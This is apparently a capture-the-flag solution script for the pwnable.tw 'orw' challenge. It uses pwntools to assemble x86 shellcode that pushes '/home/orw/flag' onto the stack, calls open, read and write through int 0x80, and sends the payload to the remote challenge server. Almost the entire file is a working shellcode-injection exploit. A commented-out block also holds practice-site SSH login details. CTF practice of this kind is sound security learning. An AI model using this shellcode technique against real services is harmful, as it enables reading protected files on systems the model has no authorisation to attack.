#!/usr/bin/env python
#-*- coding:utf-8 -*-
from pwn import *
import binascii

def get_push(stringinfo):
	res = ""
	for i in range(len(stringinfo)-1,-1,-4):
		if i-3 >= 0:
			temp = stringinfo[i] + stringinfo[i-1] + stringinfo[i-2] + stringinfo[i-3]
		else:
			temp = ""
			for j in range(len(stringinfo)-1,i-1,-1):
				temp += stringinfo[j]
		res += "push 0x" + binascii.b2a_hex(temp) + ";"
	return res.strip(";")

DEBUG = False
#context.log_level = "debug"
if DEBUG:
	io = process("./orw")
	
else:
	"""s =  ssh(host='pwnable.kr',
         port=2222,
         user='unlink',
         password='guest'
        )"""
	io = remote("chall.pwnable.tw","10001")
#gdb.attach(io,"b *0x08048585")
#context.log_level = "debug"
#define __NR_read 3
#define __NR_write 4
#define __NR_open 5 open("/home/orw/flag",O_RDONLY)
#define O_RDONLY		00
#int 80 
# return_value:eax para:ebx ecx edx esi edi
print binascii.b2a_hex("/home/orw/flag\x00\x00")
open_payload = "mov eax,5;xor ecx,ecx;" + get_push("/home/orw/flag\x00\x00") + ";mov ebx,esp;;xor edx,edx;int 0x80"
read_payload = "mov eax,3;mov ecx,ebx;mov ebx,0x3;mov edx,0x30;int 0x80"
write_payload = "mov eax,4;mov ebx,1;int 0x80"
io.sendafter("Give my your shellcode:",asm(open_payload)+asm(read_payload)+asm(write_payload))
print io.recv()
io.interactive()
